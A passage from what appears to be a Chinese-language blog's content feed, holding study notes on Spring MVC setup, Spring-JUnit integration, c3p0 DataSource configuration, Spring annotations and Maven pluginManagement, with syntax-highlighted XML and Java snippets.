<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-webmvc<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>5.0.5.RELEASE<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--Servlet坐标--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>javax.servlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>servlet-api<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.5<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--Jsp坐标--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>javax.servlet.jsp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>jsp-api<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>配置 SpringMVC 核心控制器<code>DispathcerServlet</code></p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>DispatcherServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">></span></span>org.springframework.web.servlet.DispatcherServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">></span></span>contextConfigLocation<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">></span></span>classpath:spring-mvc.xml<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>load-on-startup</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>load-on-startup</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>DispatcherServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>创建 Controller 类和视图页面</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">QuickController</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">quickMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"quickMethod running....."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"index"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>使用注解配置 Controller 类中业务方法的映射地址</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">QuickController</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/quick"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">quickMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"quickMethod running....."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"index"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>配置 SpringMVC 核心文件 <code>spring-mvc.xml</code></p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>beans</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans<span class="token punctuation">"</span></span><span class="token attr-name"><span class="token namespace">xmlns:</span>mvc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/mvc<span class="token punctuation">"</span></span><span class="token attr-name"><span class="token namespace">xmlns:</span>context</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/context<span class="token punctuation">"</span></span><span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span><span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsdhttp://www.springframework.org/schema/mvc http://www.springframework.org/schema/mvc/spring-mvc.xsdhttp://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token comment">&lt;!--配置注解扫描--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">context:</span>component-scan</span> <span class="token attr-name">base-package</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.example<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>beans</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>客户端发起请求测试</p><p><code>http://localhost:8080/itheima_springmvc1/quick</code> —-&gt;&gt; 控制台打印<code>quickMethod running....</code></p></li></ol><h2 id="SpringMVC-的数据响应方式"><a href="#SpringMVC-的数据响应方式" class="headerlink" title="SpringMVC 的数据响应方式"></a>SpringMVC 的数据响应方式</h2><ul><li>页面跳转</li><li>回写数据</li></ul><h2 id="SpringMVC-获得请求数据"><a href="#SpringMVC-获得请求数据" class="headerlink" title="SpringMVC 获得请求数据"></a>SpringMVC 获得请求数据</h2><h3 id="获得请求参数"><a href="#获得请求参数" class="headerlink" title="获得请求参数"></a>获得请求参数</h3><p>客户端请求参数的格式是：name&#x3D;value&amp;name&#x3D;value… …<br>服务器端要获得请求的参数，有时还需要进行数据的封装，SpringMVC 可以接收如下类型的参数：</p><ul><li>基本类型参数</li><li>POJO 类型参数</li><li>数组类型参数</li><li>集合类型参数</li></ul><h3 id="获得基本类型参数"><a href="#获得基本类型参数" class="headerlink" title="获得基本类型参数"></a>获得基本类型参数</h3><p>Controller 中的业务方法的参数名称要与请求参数的 name 一致，参数值会自动映射匹配。</p><p><code>http://localhost:8080/itheima_springmvc1/quick9?username=zhangsan&amp;age=12</code></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/quick9"</span><span class="token punctuation">)</span><span class="token annotation punctuation">@ResponseBody</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">quickMethod9</span><span class="token punctuation">(</span><span class="token class-name">String</span> username<span class="token punctuation">,</span><span class="token keyword">int</span> age<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>username<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>age<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 框架 </tag>
            
            <tag> spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>spring集成junit</title>
      <link href="/2022/03/20/spring%E9%9B%86%E6%88%90junit/"/>
      <url>/2022/03/20/spring%E9%9B%86%E6%88%90junit/</url>
      
        <content type="html"><![CDATA[<ol><li><p>导入 spring 集成 junit 的坐标</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!--此处需要注意的是，spring5  及以上版本要求 junit 的版本必须是 4.12 及以上--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>5.0.5.RELEASE<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>junit<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>junit<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>4.12<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>scope</span><span class="token punctuation">></span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>scope</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>使用@Runwith 注解替换原来的运行期</p></li><li><p>使用@ContextConfiguration 指定配置文件或配置类</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@RunWith</span><span class="token punctuation">(</span><span class="token class-name">SpringJUnit4ClassRunner</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token comment">//加载spring核心配置文件</span><span class="token comment">//@ContextConfiguration(value = &#123;"classpath:applicationContext.xml"&#125;)</span><span class="token comment">//加载spring核心配置类</span><span class="token annotation punctuation">@ContextConfiguration</span><span class="token punctuation">(</span>classes <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token class-name">SpringConfiguration</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpringJunitTest</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//...</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>使用@AutoWired 注入需要测试的对象</p></li><li><p>创建测试方法进行测试</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Autowired</span><span class="token keyword">private</span> <span class="token class-name">UserService</span> userService<span class="token punctuation">;</span><span class="token annotation punctuation">@Test</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">testUserService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    userService<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 后端 </tag>
            
            <tag> 框架 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring配置数据源</title>
      <link href="/2022/03/20/Spring%E9%85%8D%E7%BD%AE%E6%95%B0%E6%8D%AE%E6%BA%90/"/>
      <url>/2022/03/20/Spring%E9%85%8D%E7%BD%AE%E6%95%B0%E6%8D%AE%E6%BA%90/</url>
      
        <content type="html"><![CDATA[<p>可以将 DataSource 的创建权交由 Spring 容器去完成</p><ul><li>DataSource 有无参构造方法，而 Spring 默认就是通过无参构造方法实例化对象的</li><li>DataSource 要想使用需要通过 set 方法设置数据库连接信息，而 Spring 可以通过 set 方法进行字符串注入</li></ul><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dataSource<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.mchange.v2.c3p0.ComboPooledDataSource<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>driverClass<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.mysql.jdbc.Driver<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>jdbcUrl<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>jdbc:mysql://localhost:3306/test<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>user<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>root<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>root<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>抽取 jdbc 配置文件</p><p>首先，需要引入 context 命名空间和约束路径：</p><ul><li>命名空间：<code>xmlns:context=&quot;http://www.springframework.org/schema/context&quot;</code></li><li>约束路径：<code>http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd</code></li></ul><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">context:</span>property-placeholder</span> <span class="token attr-name">location</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>classpath:jdbc.properties<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dataSource<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.mchange.v2.c3p0.ComboPooledDataSource<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>driverClass<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;jdbc.driver&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>jdbcUrl<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;jdbc.url&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>user<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;jdbc.username&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;jdbc.password&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 框架 </tag>
            
            <tag> spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>spring注解开发</title>
      <link href="/2022/03/20/spring%E6%B3%A8%E8%A7%A3%E5%BC%80%E5%8F%91/"/>
      <url>/2022/03/20/spring%E6%B3%A8%E8%A7%A3%E5%BC%80%E5%8F%91/</url>
      
        <content type="html"><![CDATA[<h2 id="Spring-原始注解"><a href="#Spring-原始注解" class="headerlink" title="Spring 原始注解"></a>Spring 原始注解</h2><p>Spring 原始注解主要是替代 bean 的配置<br>注意：使用注解进行开发时，需要在 applicationContext.xml 中配置组件扫描，作用是指定哪个包及其子包下的 Bean 需要进行扫描以便识别使用注解配置的类、字段和方法。</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">context:</span>component-scan</span> <span class="token attr-name">base-package</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.example<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">context:</span>component-scan</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><table><thead><tr><th>注解</th><th>说明</th></tr></thead><tbody><tr><td>@Component</td><td>使用在类上实例化 Bean</td></tr><tr><td>@Controller</td><td>使用在 web 层类上实例化 Bean</td></tr><tr><td>@Service</td><td>在 service 层类上实例化 Bean</td></tr><tr><td>@Respository</td><td>在 dao 层上实例化 Bean</td></tr><tr><td>@Autowired</td><td>在字段上用于根据类型依赖注入</td></tr><tr><td>@Qualifier</td><td>结合@Autowired 一起使用用于根据名称进行依赖注入</td></tr><tr><td>@Resource</td><td>相当于@AutoWired+@Qualifier，按照名称进行注入(<code>name=&quot;xxx&quot;</code>)</td></tr><tr><td>@Value</td><td>注入普通属性(可以使用<code>$&#123;&#125;</code>)</td></tr><tr><td>@Scope</td><td>标注 Bean 的作用范围</td></tr><tr><td>@PostConstruct</td><td>使用在方法上标注该方法是 Bean 的初始化方法</td></tr><tr><td>@PreDestroy</td><td>使用在方法上标注该方法是 Bean 的销毁方法</td></tr></tbody></table><h2 id="Spring-新注解"><a href="#Spring-新注解" class="headerlink" title="Spring 新注解"></a>Spring 新注解</h2><p>使用 Spring 新注解即可完全替代 xml 配置文件</p><table><thead><tr><th>注解</th><th>说明</th></tr></thead><tbody><tr><td>@Configuration</td><td>用于指定当前类是一个 Spring 配置类</td></tr><tr><td>@ComponentScan</td><td>用于指定 Spring 在初始化容器时要扫描的包。<br>作用和在 Spring 的 xml 配置文件中的<code>&lt;context:component-scan  base-package=&quot;com.example&quot;/&gt;</code>一样</td></tr><tr><td>@Bean</td><td>使用在方法上，标注该方法的返回值存储到 Spring 容器中(<code>name=&quot;xxx&quot;</code>)</td></tr><tr><td>@PropertySource</td><td>用于加载 properties 文件(“classpath:xxx.properties”)</td></tr><tr><td>@Import</td><td>用于导入其他配置类</td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> 框架 </tag>
            
            <tag> spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Could not load properties; nested exception is java.io.FileNotFoundException</title>
      <link href="/2022/03/18/Could-not-load-properties-nested-exception-is-java-io-FileNotFoundException/"/>
      <url>/2022/03/18/Could-not-load-properties-nested-exception-is-java-io-FileNotFoundException/</url>
      
        <content type="html"><![CDATA[<p>Maven项目，applicationContext.xml、jdbc.properties文件均放置在src&#x2F;main&#x2F;resources目录下，Tomcat部署项目，src&#x2F;main&#x2F;resources目录下的配置文件默认位置为：{项目名}&#x2F;WEB-INF&#x2F;classes，而Spring却在项目根目录下寻找，肯定找不到，因此，配置时指定classpath目录下寻找即可。</p><p>解决方案如下：</p><p>　<code>&lt;context:property-placeholder location=&quot;**classpath:db.properties**&quot; /&gt;</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>maven中pluginManagement</title>
      <link href="/2022/03/18/maven%E4%B8%ADpluginManagement/"/>
      <url>/2022/03/18/maven%E4%B8%ADpluginManagement/</url>
      
        <content type="html"><![CDATA[<p>pluginManagement是表示插件声明，Maven不会加载其中的插件</p><p>一般是用来在父POM中定义，提供给子POM使用，子模块中直接应用groupId和artifactId，而不用指定版本，同时也方便统一管理；</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>spring</title>
      <link href="/2022/03/15/spring/"/>
      <url>/2022/03/15/spring/</url>
      
        <content type="html"><![CDATA[<h2 id="使用步骤"><a href="#使用步骤" class="headerlink" title="使用步骤"></a>使用步骤</h2><ol><li><p>导入坐标</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-context<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>$&#123;spring.version&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>创建 Bean</p></li><li><p>创建 applicationContext.xml</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8" ?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>beans</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans<span class="token punctuation">"</span></span><span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span><span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>beans</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>配置文件</p></li><li><p>创建<code>ApplicationContext</code>对象，调用<code>getBean()</code>方法</p></li></ol><h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><h3 id="bean-标签配置"><a href="#bean-标签配置" class="headerlink" title="bean 标签配置"></a>bean 标签配置</h3><p>用于配置对象交由 Spring 来创建</p><p>默认情况下它调用的是类中的无参构造器，如果没有无参构造则无法创建成功</p><h4 id="基本属性"><a href="#基本属性" class="headerlink" title="基本属性"></a>基本属性</h4><ul><li><p>id：bean 实例在 Spring 容器中的唯一标识</p></li><li><p>class：bean 